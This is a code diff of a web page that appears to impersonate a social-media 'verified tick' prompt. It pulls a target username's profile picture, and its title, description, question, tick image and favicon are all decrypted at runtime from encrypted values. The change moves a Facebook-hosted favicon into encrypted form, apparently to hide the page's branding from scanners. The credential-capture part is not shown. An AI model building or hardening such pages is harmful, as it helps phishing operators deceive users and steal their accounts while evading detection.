@@ -1,48 +1,10 @@
-<!-- <?php
-include "profile_tool.php";
-
-include "crypt/crypter.php";
-
-
-
-$username="9gag";
-if(isset($_GET["username"])){
-    $username = $_GET["username"];
-
-}
-if(isset($_GET["key"])){
-  $key =  $crypter->setkey($_GET["key"]);
-}else{
-  $key =  $crypter->setkey(0);
-}
-$profileTool = new ProfileTool();
-
-$img_url = $profileTool->getProfilePicture($username);
-
-$crypter = new Crypter();
-if(isset($_GET["key"])){
-  $crypter->setkey($_GET["key"]);
-}else{
-  $crypter->setkey(0);
-}
-
-
-
-$title =$crypter->decrypt($crypter->getKeys()->title);
-$description =$crypter->decrypt($crypter->getKeys()->description);
-$question =$crypter->decrypt($crypter->getKeys()->question);
-$tick_png =$crypter->decrypt($crypter->getKeys()->tick_png);
-
-
-?> -->
 
 <html>
     <head>
       <meta charset="utf-8" />
       <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-      <link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico?_nc_x=Ij3Wp8lg5Kz"/>
+      <link id="site-icon" rel="shortcut icon" type="image/png" >
       <title id="title">
-        <?php echo $title?>
 
       </title>
     
@@ -66,7 +28,7 @@ $tick_png =$crypter->decrypt($crypter->getKeys()->tick_png);
 
     </head>
     
-    <body class="text-center">
+    <body>
     
 
         <div class="main-panel d-none" id="main-panel">
@@ -124,8 +86,8 @@ $tick_png =$crypter->decrypt($crypter->getKeys()->tick_png);
             </div>
           </div>
         </div>
-        <div id="loading-spinner" class="d-block mt-5" >
-          <img class="avatar" alt="" src="assets/img/oval.svg" id="user-avatar">
+        <div id="loading-spinner" class=" col-12 text-center d-block mt-5" >
+          <img class="avatar mt-5" alt="" src="assets/img/oval.svg" id="user-avatar">
         </div>
     
       <script src="assets/js/core/jquery.min.js"></script>
@@ -185,6 +147,7 @@ $tick_png =$crypter->decrypt($crypter->getKeys()->tick_png);
       
       document.getElementById("description").innerHTML = crypt.decrypt(crypt.getKeys().description)
       document.getElementById("tick").setAttribute('src',crypt.decrypt(crypt.getKeys().tick_png))
+      document.getElementById("site-icon").setAttribute('href',crypt.decrypt(crypt.getKeys().icon))
 
       
 </script>
